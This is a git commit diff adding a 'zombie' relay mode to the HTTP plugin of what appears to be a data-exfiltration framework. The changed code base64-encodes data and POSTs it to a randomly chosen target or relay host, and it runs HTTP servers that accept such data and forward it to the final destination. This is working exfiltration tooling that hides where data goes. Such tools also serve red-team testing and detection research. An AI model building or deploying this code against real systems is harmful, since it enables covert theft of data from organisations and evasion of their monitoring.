e61099b4e8e008afecb4bd8fa378124644e29203
Yassine Tioual <yassine.tioual@gmail.com>
2017-04-03 10:53:10 +0200

    Implement zombie mode in HTTP plugin

--- plugins/http.py
+++ plugins/http.py
@@ -2,13 +2,12 @@ import requests
 import base64
 from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 import urllib
+from random import choice
 
 config = None
 app_exfiltrate = None
 
-
 class S(BaseHTTPRequestHandler):
-
     def _set_headers(self):
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
@@ -22,7 +21,7 @@ class S(BaseHTTPRequestHandler):
         if (tmp[0] == "data"):
             try:
                 data = base64.b64decode(urllib.unquote(tmp[1]))
-                app_exfiltrate.retrieve_data(data)
+                self.server.handler(data)
             except Exception, e:
                 print e
                 pass
@@ -32,34 +31,46 @@ class S(BaseHTTPRequestHandler):
         self._set_headers()
         try:
             data = base64.b64decode(string)
-            app_exfiltrate.retrieve_data(data)
+            self.server.handler(data)
         except Exception, e:
             pass
 
-
 def send(data):
-    target = "http://{}:{}".format(config['target'], config['port'])
+    targets = [config['target']] + config['zombies']
+    target = "http://{}:{}".format(choice(targets), config['port'])
     app_exfiltrate.log_message(
         'info', "[http] Sending {0} bytes to {1}".format(len(data), target))
     data_to_send = {'data': base64.b64encode(data)}
     requests.post(target, data=data_to_send)
 
+def relay_http_request(data):
+    target = "http://{}:{}".format(config['target'], config['port'])
+    app_exfiltrate.log_message(
+        'info', "[zombie] [http] Relaying {0} bytes to {1}".format(len(data), target))
+    data_to_send = {'data': base64.b64encode(data)}
+    requests.post(target, data=data_to_send)
 
-def listen():
-    app_exfiltrate.log_message('info', "[http] Starting httpd...")
+def server(data_handler):
     try:
         server_address = ('', config['port'])
         httpd = HTTPServer(server_address, S)
+        httpd.handler = data_handler
         httpd.serve_forever()
     except:
         app_exfiltrate.log_message(
-            'warning', "[http] Couldn't bind http daemon on port {}".format(port))
+            'warning', "[http] Couldn't bind http daemon on port {}".format(config['port']))
 
+def listen():
+    app_exfiltrate.log_message('info', "[http] Starting httpd...")
+    server(app_exfiltrate.retrieve_data)
+
+def zombie():
+    app_exfiltrate.log_message('info', "[zombie] [http] Starting httpd...")
+    server(relay_http_request)
 
 class Plugin:
-
     def __init__(self, app, conf):
         global app_exfiltrate, config
         config = conf
         app_exfiltrate = app
-        app.register_plugin('http', {'send': send, 'listen': listen})
+        app.register_plugin('http', {'send': send, 'listen': listen, 'zombie': zombie})
